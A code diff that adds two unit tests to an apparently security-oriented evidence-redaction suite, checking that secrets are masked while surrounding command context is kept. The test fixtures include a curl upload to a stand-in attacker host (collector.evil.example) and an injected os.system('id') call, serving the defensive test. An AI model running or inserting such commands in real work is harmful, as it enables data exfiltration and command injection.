@@ -103,6 +103,18 @@ def test_preserves_command_context_after_authorization_header_redaction() -> Non
     assert "token=<redacted>" in redacted
 
 
+def test_bare_authorization_value_redacts_token_before_context() -> None:
+    """Authorization without a known scheme should redact the first token, not the following evidence."""
+    text = "Authorization: sk-live-secret curl https://collector.evil.example/upload"
+
+    redacted = redact_evidence_string(text, max_chars=500)
+
+    assert "sk-live-secret" not in redacted
+    assert f"Authorization: {REDACTED_EVIDENCE_VALUE}" in redacted
+    assert "curl" in redacted
+    assert "collector.evil.example" in redacted
+
+
 def test_redaction_runtime_is_bounded_before_truncation() -> None:
     """Evidence redaction should not scan attacker-controlled megabyte strings before truncating."""
     text = "api_key=" + ("\\\\" * 200_000) + '"unterminated-secret'
@@ -1164,6 +1176,16 @@ def test_command_context_literals_redact_credential_arguments() -> None:
         assert command_context in redacted
         assert "collector.evil.example" in redacted
         assert REDACTED_EVIDENCE_VALUE in redacted
+
+
+def test_residual_literal_redaction_preserves_command_context() -> None:
+    """Cleanup of partially redacted expressions should not erase command evidence."""
+    text = 'client_secret = "C001_LITERAL_SECRET_123456" + os.system("id")'
+
+    redacted = redact_evidence_string(text, max_chars=500)
+
+    assert "C001_LITERAL_SECRET" not in redacted
+    assert f'client_secret = {REDACTED_EVIDENCE_VALUE} + os.system("id")' in redacted
 
 
 def test_colon_dense_non_key_text_skips_ast_parse(monkeypatch: pytest.MonkeyPatch) -> None:
